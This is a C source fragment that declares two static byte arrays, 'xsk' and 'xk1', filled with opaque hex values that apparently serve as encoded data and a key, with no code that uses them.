static unsigned char xsk[] = {
    0x45, 0x55, 0x61, 0x58, 0x16, 0x56, 0x6a, 0x89, 
    0xd6, 0xb8, 0x66, 0x80, 0xc0, 0xae, 0x8f, 0x7a, 
    0xaa, 0x12, 0x06, 0x5c, 0x3b, 0x6f, 0x9c, 0x0a, 
    0x65, 0xea, 0x61, 0xc5, 0xa7, 0xf4, 0xf8, 0xaa, 
    0xa1, 0x70, 0xa3, 0x22, 0x05, 0x2b, 0xcc, 0x48, 
    0xab, 0x79, 0x9b, 0x3d, 0xd1, 0xaf, 0x92, 0xc0, 
    0x02, 0x93, 0xc8, 0x27, 0x77, 0x34, 0x87, 0x15, 
    0x5b, 0xe7, 0x88, 0x42, 0x6b, 0xb7, 0xd2, 0xbf, 
    0xcb, 0x05, 0x0e, 0x01, 0x19, 0x78, 0x48, 0x96, 
    0x46, 0xf1, 0x63, 0x1a, 0x0e, 0x02, 0x2b, 0x12, 
    0xf7, 0x27, 0xe9, 0x93, 0xf3, 0xdd, 0x42, 0x20, 
    0x3d, 0xc0, 0xff, 0x46, 0x0e, 0x73, 0x7b, 0x73, 
    0x34, 0x19, 0xa5, 0xd1, 0xa9, 0xc1, 0x44, 0x56, 
    0xea, 0xf7, 0xcb, 0x72, 0x6c, 0x09, 0x69, 0x82, 
    0x76, 0x8f, 0x31, 0xcb, 0x0e, 0x73, 0x53, 0x11, 
    0xc3, 0xcd, 0x01, 0x77, 0xd5, 0xeb, 0xd2, 0x36, 
    0xb9, 0xcd, 0xb8, 0x0b, 0xab, 0x6f, 0x6a, 0x40, 
    0x72, 0x85, 0xd8, 0x34, 0x1d, 0x52, 0xc9, 0x7f, 
    0x8d, 0xda, 0x87, 0x5b, 0x62, 0x22, 0x06, 0x72, 
    0xde, 0xee, 0x7d, 0x1c, 0xf5, 0xaa, 0x86, 0x4d, 
    0x25, 0x19, 0x0d, 0xd3, 0xc0, 0x62, 0x7e, 0x93, 
    0xb6, 0x5d, 0x32, 0x28, 0x3d, 0xb7, 0x03, 0xb3, 
    0x50, 0xaa, 0x11, 0xd2, 0x59, 0xeb, 0xff, 0x81, 
    0x06, 0x5b, 0x10, 0xd4, 0x1b, 0xbb, 0x66, 0xcc, 
    0x9d, 0xa5, 0x4a, 0x17, 0x71, 0x82, 0x25, 0x1c, 
    0x69, 0x17, 0xf8, 0x67, 0xc3, 0x55, 0x85, 0x38, 
    0x54, 0x96, 0x79, 0xb2, 0x14, 0xf5, 0x9a, 0x65, 
    0x8b, 0x76, 0x4a, 0x32, 0x85, 0x5a, 0x02, 0x28, 
    0x4e, 0x64, 0xe7, 0x26, 0x10, 0xf3, 0xc9, 0x8f, 
    0x23, 0x2a, 0x54, 0x11, 0x54, 0xb5, 0x0c, 0x48, 
    0x07, 0xbb, 0xba, 0x58, 0x2a, 0x0d, 0x17, 0x78, 
    0x53, 0x3c, 0xdd, 0x22, 0x4c, 0x4f, 0x8f, 0x60, 
    0xfa, 0x01, 0x69, 0x27, 0xcd, 0x24, 0x1a, 0x1f, 
    0xcf, 0xd5, 0x1c, 0x4b, 0xe5, 0x9a, 0x87, 0x26, 
    0x6b, 0xa9, 0xc8, 0x7c, 0x06, 0x8d, 0x87, 0x34, 
    0x76, 0x3e, 0xad, 0xe7, 0x76, 0x20, 0x20, 0x52, 
    0xfd, 0x4a, 0x4c, 0xdd, 0xf8, 0xff, 0x1a
};
static unsigned char xk1[] = {
    0x8d, 0x0a, 0xe3, 0x0d, 0x28, 0x04, 0xa8, 0xd2, 
    0x50, 0x95, 0x81, 0x0e, 0x50, 0x89, 0x81, 0xae, 
    0xd4, 0x48, 0xe8, 0x8f, 0xbe, 0x99, 0x6c, 0xdb, 
    0x8b, 0xea, 0xdd, 0xea, 0x39, 0xa5, 0xf4, 0x7a, 
    0xe4, 0x88, 0x88, 0x5b, 0x8d, 0x07, 0xdb, 0xe3, 
    0x90, 0x5c, 0xc9, 0xbd, 0xfa, 0xe4, 0x63, 0x65, 
    0xfd, 0x67, 0x17, 0x8d, 0x95, 0xf6, 0xca, 0xc0, 
    0x62, 0x21, 0xc3, 0xac, 0xd5, 0x83, 0xf3, 0x5c
};
